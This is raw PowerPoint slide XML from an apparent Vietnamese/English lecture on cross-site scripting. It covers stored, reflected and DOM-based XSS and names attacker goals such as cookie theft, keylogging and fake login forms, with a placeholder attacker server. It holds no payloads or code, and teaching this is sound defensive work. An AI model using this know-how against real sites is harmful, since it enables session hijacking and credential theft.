    <p:extLst>
      <p:ext uri="{BB962C8B-B14F-4D97-AF65-F5344CB8AC3E}">
        <p14:creationId xmlns:p14="http://schemas.microsoft.com/office/powerpoint/2010/main" val="2062506146"/>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0433053C-6952-4E0F-A139-E43603E39F67}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr>
            <a:spLocks noGrp="1" noChangeArrowheads="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph type="title"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="1524000" y="381000"/>
            <a:ext cx="6923089" cy="563562"/>
          </a:xfrm>
        </p:spPr>
        <p:txBody>
          <a:bodyPr/>
          <a:lstStyle/>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" altLang="en-US">
                <a:latin typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
                <a:cs typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
              </a:rPr>
              <a:t>Các hình thức tồn tại của XSS</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" altLang="en-US"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="3" name="Content Placeholder 2">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{25E6257E-DF01-4ED2-9B8C-8A72A762113E}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph idx="1"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="2438400" y="1412876"/>
            <a:ext cx="8229600" cy="5095875"/>
          </a:xfrm>
        </p:spPr>
        <p:txBody>
          <a:bodyPr/>
          <a:lstStyle/>
          <a:p>
            <a:pPr>
              <a:buClr>
                <a:schemeClr val="tx2"/>
              </a:buClr>
              <a:buFont typeface="Wingdings" panose="05000000000000000000" pitchFamily="2" charset="2"/>
              <a:buChar char="Ø"/>
              <a:defRPr/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US">
                <a:solidFill>
                  <a:schemeClr val="tx2"/>
                </a:solidFill>
              </a:rPr>
              <a:t>Stored XSS</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr>
              <a:buClr>
                <a:schemeClr val="tx2"/>
              </a:buClr>
              <a:buFont typeface="Wingdings" panose="05000000000000000000" pitchFamily="2" charset="2"/>
              <a:buChar char="Ø"/>
              <a:defRPr/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US">
                <a:solidFill>
                  <a:schemeClr val="tx2"/>
                </a:solidFill>
              </a:rPr>
              <a:t>Reflected XSS</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr>
              <a:buClr>
                <a:schemeClr val="tx2"/>
              </a:buClr>
              <a:buFont typeface="Wingdings" panose="05000000000000000000" pitchFamily="2" charset="2"/>
              <a:buChar char="Ø"/>
              <a:defRPr/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US">
                <a:solidFill>
                  <a:schemeClr val="tx2"/>
                </a:solidFill>
              </a:rPr>
              <a:t>DOM-based XSS</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="0" indent="0">
              <a:buNone/>
              <a:defRPr/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" b="1">
                <a:solidFill>
                  <a:schemeClr val="tx2"/>
                </a:solidFill>
              </a:rPr>
              <a:t> </a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr>
              <a:defRPr/>
            </a:pPr>
            <a:endParaRPr lang="en-US" b="1">
              <a:solidFill>
                <a:schemeClr val="tx2"/>
              </a:solidFill>
            </a:endParaRPr>
          </a:p>
          <a:p>
            <a:pPr>
              <a:defRPr/>
            </a:pPr>
            <a:endParaRPr lang="en-US"/>
          </a:p>
        </p:txBody>
      </p:sp>
    </p:spTree>
    <p:extLst>
      <p:ext uri="{BB962C8B-B14F-4D97-AF65-F5344CB8AC3E}">
        <p14:creationId xmlns:p14="http://schemas.microsoft.com/office/powerpoint/2010/main" val="3004787799"/>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CF31D895-5E97-4741-860E-3C2B37E782E9}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr>
            <a:spLocks noGrp="1" noChangeArrowheads="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph type="title"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="3143251" y="333376"/>
            <a:ext cx="6762749" cy="563563"/>
          </a:xfrm>
        </p:spPr>
        <p:txBody>
          <a:bodyPr>
            <a:normAutofit fontScale="90000"/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:pPr eaLnBrk="1" hangingPunct="1"/>
            <a:r>
              <a:rPr lang="en-US" altLang="en-US">
                <a:latin typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
                <a:cs typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
              </a:rPr>
              <a:t>Mức độ nguy hiểm của XSS</a:t>
            </a:r>
            <a:br>
              <a:rPr lang="en-US" altLang="en-US">
                <a:latin typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
                <a:cs typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
              </a:rPr>
            </a:br>
            <a:endParaRPr lang="en-US" altLang="en-US">
              <a:latin typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
              <a:cs typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
            </a:endParaRPr>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:pic>
        <p:nvPicPr>
          <p:cNvPr id="13315" name="Content Placeholder 3">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{F5BFE2DB-8143-464F-AA67-ADD30F6BB869}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvPicPr>
            <a:picLocks noGrp="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919288" y="1484313"/>
            <a:ext cx="8229600" cy="5078412"/>
          </a:xfrm>
        </p:spPr>
      </p:pic>
    </p:spTree>
    <p:extLst>
      <p:ext uri="{BB962C8B-B14F-4D97-AF65-F5344CB8AC3E}">
        <p14:creationId xmlns:p14="http://schemas.microsoft.com/office/powerpoint/2010/main" val="2349050683"/>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ECE25686-97AA-4B7C-BE87-EB3E045DA7C0}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr>
            <a:spLocks noGrp="1" noChangeArrowheads="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph type="title"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="1524000" y="404813"/>
            <a:ext cx="7391400" cy="563562"/>
          </a:xfrm>
        </p:spPr>
        <p:txBody>
          <a:bodyPr/>
          <a:lstStyle/>
          <a:p>
            <a:pPr eaLnBrk="1" hangingPunct="1"/>
            <a:r>
              <a:rPr lang="en-US" altLang="en-US">
                <a:latin typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
                <a:cs typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
              </a:rPr>
              <a:t>Mục đích mà XSS hướng tới</a:t>
            </a:r>
            <a:br>
              <a:rPr lang="en-US" altLang="en-US">
                <a:latin typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
                <a:cs typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
              </a:rPr>
            </a:br>
            <a:endParaRPr lang="en-US" altLang="en-US">
              <a:latin typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
              <a:cs typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
            </a:endParaRPr>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="14339" name="Content Placeholder 2">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{292E0444-F630-4774-85C1-05A8A4530AA2}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr>
            <a:spLocks noGrp="1" noChangeArrowheads="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph idx="1"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="1066800" y="1752601"/>
            <a:ext cx="9601200" cy="4495800"/>
          </a:xfrm>
        </p:spPr>
        <p:txBody>
          <a:bodyPr>
            <a:normAutofit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:pPr algn="just">
              <a:buClr>
                <a:schemeClr val="tx2"/>
              </a:buClr>
              <a:buFont typeface="Wingdings" panose="05000000000000000000" pitchFamily="2" charset="2"/>
              <a:buChar char="§"/>
            </a:pPr>
            <a:r>
              <a:rPr lang="vi-VN" altLang="en-US" b="1">
                <a:solidFill>
                  <a:schemeClr val="tx2"/>
                </a:solidFill>
              </a:rPr>
              <a:t>Cookie</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="vi-VN" altLang="en-US">
                <a:solidFill>
                  <a:schemeClr val="tx2"/>
                </a:solidFill>
              </a:rPr>
              <a:t>: </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="en-US">
                <a:solidFill>
                  <a:schemeClr val="tx2"/>
                </a:solidFill>
              </a:rPr>
              <a:t>H</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="vi-VN" altLang="en-US">
                <a:solidFill>
                  <a:schemeClr val="tx2"/>
                </a:solidFill>
              </a:rPr>
              <a:t>acker có thể lấy được cookie của người dùng và dùng những thông tin trong cookie để giả mạo phiên truy cập hoặc lấy những thông tin nhạy cảm khác được lưu trong cookie.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr algn="just">
              <a:buClr>
                <a:schemeClr val="tx2"/>
              </a:buClr>
              <a:buFont typeface="Wingdings" panose="05000000000000000000" pitchFamily="2" charset="2"/>
              <a:buChar char="§"/>
            </a:pPr>
            <a:r>
              <a:rPr lang="vi-VN" altLang="en-US" b="1">
                <a:solidFill>
                  <a:schemeClr val="tx2"/>
                </a:solidFill>
              </a:rPr>
              <a:t>Keylogging:</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="vi-VN" altLang="en-US">
                <a:solidFill>
                  <a:schemeClr val="tx2"/>
                </a:solidFill>
              </a:rPr>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="en-US">
                <a:solidFill>
                  <a:schemeClr val="tx2"/>
                </a:solidFill>
              </a:rPr>
              <a:t>H</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="vi-VN" altLang="en-US">
                <a:solidFill>
                  <a:schemeClr val="tx2"/>
                </a:solidFill>
              </a:rPr>
              <a:t>acker có thể ghi lại những thao tác gõ phím của người dùng và gửi tất cả những thao tác gõ phím đó về cho hắn để thực hiện những mục đích như đánh cắp các thông tin nhạy cảm, lấy mật khẩu truy cập website hoặc mã số thẻ tín dụng…</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr algn="just">
              <a:buClr>
                <a:schemeClr val="tx2"/>
              </a:buClr>
              <a:buFont typeface="Wingdings" panose="05000000000000000000" pitchFamily="2" charset="2"/>
              <a:buChar char="§"/>
            </a:pPr>
            <a:r>
              <a:rPr lang="vi-VN" altLang="en-US" b="1">
                <a:solidFill>
                  <a:schemeClr val="tx2"/>
                </a:solidFill>
              </a:rPr>
              <a:t>Phishing</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="vi-VN" altLang="en-US">
                <a:solidFill>
                  <a:schemeClr val="tx2"/>
                </a:solidFill>
              </a:rPr>
              <a:t>: </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="en-US">
                <a:solidFill>
                  <a:schemeClr val="tx2"/>
                </a:solidFill>
              </a:rPr>
              <a:t>H</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="vi-VN" altLang="en-US">
                <a:solidFill>
                  <a:schemeClr val="tx2"/>
                </a:solidFill>
              </a:rPr>
              <a:t>acker có thể thay đổi giao diện của website bằng cách thay đổi cấu trúc HTML trong trang web để đánh lừa người dùng. Hacker có thể tạo ra những form đăng nhập giả nhằm lừa người dùng đăng nhập vào để đánh cắp mật khẩu</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr eaLnBrk="1" hangingPunct="1"/>
            <a:endParaRPr lang="en-US" altLang="en-US"/>
          </a:p>
        </p:txBody>
      </p:sp>
    </p:spTree>
    <p:extLst>
      <p:ext uri="{BB962C8B-B14F-4D97-AF65-F5344CB8AC3E}">
        <p14:creationId xmlns:p14="http://schemas.microsoft.com/office/powerpoint/2010/main" val="1998930307"/>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9BF9EF19-953D-417F-8CC7-C5F9C16525F1}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr>
            <a:spLocks noGrp="1" noChangeArrowheads="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph type="title"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="1416050" y="260351"/>
            <a:ext cx="7391400" cy="563563"/>
          </a:xfrm>
        </p:spPr>
        <p:txBody>
          <a:bodyPr/>
          <a:lstStyle/>
          <a:p>
            <a:pPr eaLnBrk="1" hangingPunct="1"/>
            <a:r>
              <a:rPr lang="en-US" altLang="en-US">
                <a:latin typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
                <a:cs typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
              </a:rPr>
              <a:t>Các hình thức tồn tại của XSS</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="3" name="Content Placeholder 2">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{ED990DEF-6973-40DB-A6C5-CEECAE7BA308}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph idx="1"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="2279650" y="1557339"/>
            <a:ext cx="8229600" cy="5095875"/>
          </a:xfrm>
        </p:spPr>
        <p:txBody>
          <a:bodyPr/>
          <a:lstStyle/>
          <a:p>
            <a:pPr marL="0" indent="0">
              <a:buNone/>
              <a:defRPr/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" b="1">
                <a:solidFill>
                  <a:schemeClr val="tx2"/>
                </a:solidFill>
              </a:rPr>
              <a:t>Stored XSS</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr eaLnBrk="1" hangingPunct="1">
              <a:buClr>
                <a:schemeClr val="tx2"/>
              </a:buClr>
              <a:buFont typeface="Wingdings" panose="05000000000000000000" pitchFamily="2" charset="2"/>
              <a:buChar char="§"/>
              <a:defRPr/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US">
                <a:solidFill>
                  <a:schemeClr val="tx2"/>
                </a:solidFill>
              </a:rPr>
              <a:t>Phát sinh do không lọc dữ liệu gửi lên một cách đúng đắn</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr eaLnBrk="1" hangingPunct="1">
              <a:buClr>
                <a:schemeClr val="tx2"/>
              </a:buClr>
              <a:buFont typeface="Wingdings" panose="05000000000000000000" pitchFamily="2" charset="2"/>
              <a:buChar char="§"/>
              <a:defRPr/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US">
                <a:solidFill>
                  <a:schemeClr val="tx2"/>
                </a:solidFill>
              </a:rPr>
              <a:t>Kẻ tấn công chèn đoạn script nguy hiểm vào website</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr eaLnBrk="1" hangingPunct="1">
              <a:buClr>
                <a:schemeClr val="tx2"/>
              </a:buClr>
              <a:buFont typeface="Wingdings" panose="05000000000000000000" pitchFamily="2" charset="2"/>
              <a:buChar char="§"/>
              <a:defRPr/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US">
                <a:solidFill>
                  <a:schemeClr val="tx2"/>
                </a:solidFill>
              </a:rPr>
              <a:t>Mã độc được lưu lại trong database của website</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr eaLnBrk="1" hangingPunct="1">
              <a:buClr>
                <a:schemeClr val="tx2"/>
              </a:buClr>
              <a:buFont typeface="Wingdings" panose="05000000000000000000" pitchFamily="2" charset="2"/>
              <a:buChar char="§"/>
              <a:defRPr/>
            </a:pPr>
            <a:endParaRPr lang="en-US">
              <a:solidFill>
                <a:schemeClr val="tx2"/>
              </a:solidFill>
            </a:endParaRPr>
          </a:p>
        </p:txBody>
      </p:sp>
    </p:spTree>
    <p:extLst>
      <p:ext uri="{BB962C8B-B14F-4D97-AF65-F5344CB8AC3E}">
        <p14:creationId xmlns:p14="http://schemas.microsoft.com/office/powerpoint/2010/main" val="1591182202"/>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9BF9EF19-953D-417F-8CC7-C5F9C16525F1}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr>
            <a:spLocks noGrp="1" noChangeArrowheads="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph type="title"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="1416050" y="260351"/>
            <a:ext cx="7391400" cy="563563"/>
          </a:xfrm>
        </p:spPr>
        <p:txBody>
          <a:bodyPr/>
          <a:lstStyle/>
          <a:p>
            <a:pPr eaLnBrk="1" hangingPunct="1"/>
            <a:r>
              <a:rPr lang="en-US" altLang="en-US">
                <a:latin typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
                <a:cs typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
              </a:rPr>
              <a:t>Các hình thức tồn tại của XSS</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="3" name="Content Placeholder 2">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{ED990DEF-6973-40DB-A6C5-CEECAE7BA308}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph idx="1"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="990600" y="1557339"/>
            <a:ext cx="10363200" cy="5095875"/>
          </a:xfrm>
        </p:spPr>
        <p:txBody>
          <a:bodyPr>
            <a:normAutofit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" b="1"/>
              <a:t>Actors in an XSS attack: </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US">
                <a:solidFill>
                  <a:srgbClr val="FF0000"/>
                </a:solidFill>
              </a:rPr>
              <a:t>the website, the victim, and the attacker.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr>
              <a:buClr>
                <a:schemeClr val="tx2"/>
              </a:buClr>
              <a:buFont typeface="Wingdings" panose="05000000000000000000" pitchFamily="2" charset="2"/>
              <a:buChar char="§"/>
              <a:defRPr/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US">
                <a:solidFill>
                  <a:schemeClr val="tx2"/>
                </a:solidFill>
              </a:rPr>
              <a:t>The </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US">
                <a:solidFill>
                  <a:srgbClr val="FF0000"/>
                </a:solidFill>
              </a:rPr>
              <a:t>website</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US">
                <a:solidFill>
                  <a:schemeClr val="tx2"/>
                </a:solidFill>
              </a:rPr>
              <a:t> serves HTML pages to users who request them. In our examples, it is located at </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US">
                <a:solidFill>
                  <a:schemeClr val="tx2"/>
                </a:solidFill>
                <a:hlinkClick r:id="rId2"/>
              </a:rPr>
              <a:t>http://website/</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US">
                <a:solidFill>
                  <a:schemeClr val="tx2"/>
                </a:solidFill>
              </a:rPr>
              <a:t>.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr lvl="1">
              <a:buClr>
                <a:schemeClr val="tx2"/>
              </a:buClr>
              <a:buFont typeface="Wingdings" panose="05000000000000000000" pitchFamily="2" charset="2"/>
              <a:buChar char="§"/>
              <a:defRPr/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US">
                <a:solidFill>
                  <a:schemeClr val="tx2"/>
                </a:solidFill>
              </a:rPr>
              <a:t>The website's database is a database that stores some of the user input included in the website's pages.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr>
              <a:buClr>
                <a:schemeClr val="tx2"/>
              </a:buClr>
              <a:buFont typeface="Wingdings" panose="05000000000000000000" pitchFamily="2" charset="2"/>
              <a:buChar char="§"/>
              <a:defRPr/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US">
                <a:solidFill>
                  <a:schemeClr val="tx2"/>
                </a:solidFill>
              </a:rPr>
              <a:t>The </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US">
                <a:solidFill>
                  <a:srgbClr val="FF0000"/>
                </a:solidFill>
              </a:rPr>
              <a:t>victim</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US">
                <a:solidFill>
                  <a:schemeClr val="tx2"/>
                </a:solidFill>
              </a:rPr>
              <a:t> is a normal user of the website who requests pages from it using his browser.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr>
              <a:buClr>
                <a:schemeClr val="tx2"/>
              </a:buClr>
              <a:buFont typeface="Wingdings" panose="05000000000000000000" pitchFamily="2" charset="2"/>
              <a:buChar char="§"/>
              <a:defRPr/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US">
                <a:solidFill>
                  <a:schemeClr val="tx2"/>
                </a:solidFill>
              </a:rPr>
              <a:t>The </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US">
                <a:solidFill>
                  <a:srgbClr val="FF0000"/>
                </a:solidFill>
              </a:rPr>
              <a:t>attacker </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US">
                <a:solidFill>
                  <a:schemeClr val="tx2"/>
                </a:solidFill>
              </a:rPr>
              <a:t>is a malicious user of the website who intends to launch an attack on the victim by exploiting an XSS vulnerability in the website.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr lvl="1">
              <a:buClr>
                <a:schemeClr val="tx2"/>
              </a:buClr>
              <a:buFont typeface="Wingdings" panose="05000000000000000000" pitchFamily="2" charset="2"/>
              <a:buChar char="§"/>
              <a:defRPr/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US">
                <a:solidFill>
                  <a:schemeClr val="tx2"/>
                </a:solidFill>
              </a:rPr>
              <a:t>The attacker's server is a web server controlled by the attacker for the sole purpose of stealing the victim's sensitive information. In our examples, it is located at </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US">
                <a:solidFill>
                  <a:schemeClr val="tx2"/>
                </a:solidFill>
                <a:hlinkClick r:id="rId2"/>
              </a:rPr>
              <a:t>http://attacker/.</a:t>
            </a:r>
            <a:endParaRPr lang="en-US">
              <a:solidFill>
                <a:schemeClr val="tx2"/>
              </a:solidFill>
            </a:endParaRPr>
          </a:p>
        </p:txBody>
      </p:sp>
    </p:spTree>
    <p:extLst>
      <p:ext uri="{BB962C8B-B14F-4D97-AF65-F5344CB8AC3E}">
        <p14:creationId xmlns:p14="http://schemas.microsoft.com/office/powerpoint/2010/main" val="1340198060"/>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153020FD-1D41-4233-9F7A-F251656AF255}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr>
            <a:spLocks noGrp="1" noChangeArrowheads="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph type="title"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="1271588" y="133351"/>
            <a:ext cx="7391401" cy="563563"/>
          </a:xfrm>
        </p:spPr>
        <p:txBody>
          <a:bodyPr/>
          <a:lstStyle/>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" altLang="en-US">
                <a:latin typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
                <a:cs typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
              </a:rPr>
              <a:t>Các hình thức tồn tại của XSS</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" altLang="en-US"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="3" name="Content Placeholder 2">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{8D869573-F817-46E6-B16E-6CE1CF582391}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph idx="1"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr/>
        <p:txBody>
          <a:bodyPr/>
          <a:lstStyle/>
          <a:p>
            <a:pPr marL="0" indent="0">
              <a:buNone/>
              <a:defRPr/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" b="1">
                <a:solidFill>
                  <a:schemeClr val="tx2"/>
                </a:solidFill>
              </a:rPr>
              <a:t>Stored XSS</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr>
              <a:defRPr/>
            </a:pPr>
            <a:endParaRPr lang="en-US"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:pic>
        <p:nvPicPr>
          <p:cNvPr id="8196" name="Content Placeholder 3" descr="C:\Users\Vu Dang\Desktop\4667cae04082889b154ce2875b27b2ba47f82582.png">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{ECA40C74-503B-4575-84E9-13DE56FEE8FF}"/>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2667000" y="1751775"/>
            <a:ext cx="8229600" cy="440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29320158"/>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9BF9EF19-953D-417F-8CC7-C5F9C16525F1}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr>
            <a:spLocks noGrp="1" noChangeArrowheads="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph type="title"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="1416050" y="260351"/>
            <a:ext cx="7391400" cy="563563"/>
          </a:xfrm>
        </p:spPr>
        <p:txBody>
          <a:bodyPr/>
          <a:lstStyle/>
          <a:p>
            <a:pPr eaLnBrk="1" hangingPunct="1"/>
            <a:r>
              <a:rPr lang="en-US" altLang="en-US">
                <a:latin typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
                <a:cs typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
              </a:rPr>
              <a:t>Các hình thức tồn tại của XSS</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="4" name="Content Placeholder 3">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{30B3D186-84A8-4B92-93D5-F276ED4B5860}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph idx="1"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="304800" y="1615281"/>
            <a:ext cx="10515600" cy="4351338"/>
          </a:xfrm>
        </p:spPr>
        <p:txBody>
          <a:bodyPr/>
          <a:lstStyle/>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" b="1"/>
              <a:t>Stored XSS</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="0" indent="0">
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" b="1"/>
              <a:t>(Persistent XSS)</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:pic>
        <p:nvPicPr>
          <p:cNvPr id="5" name="Picture 4">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{8E6B6F2D-60F4-4E6F-8747-9BE445155338}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvPicPr>
            <a:picLocks noChangeAspect="1"/>
          </p:cNvPicPr>
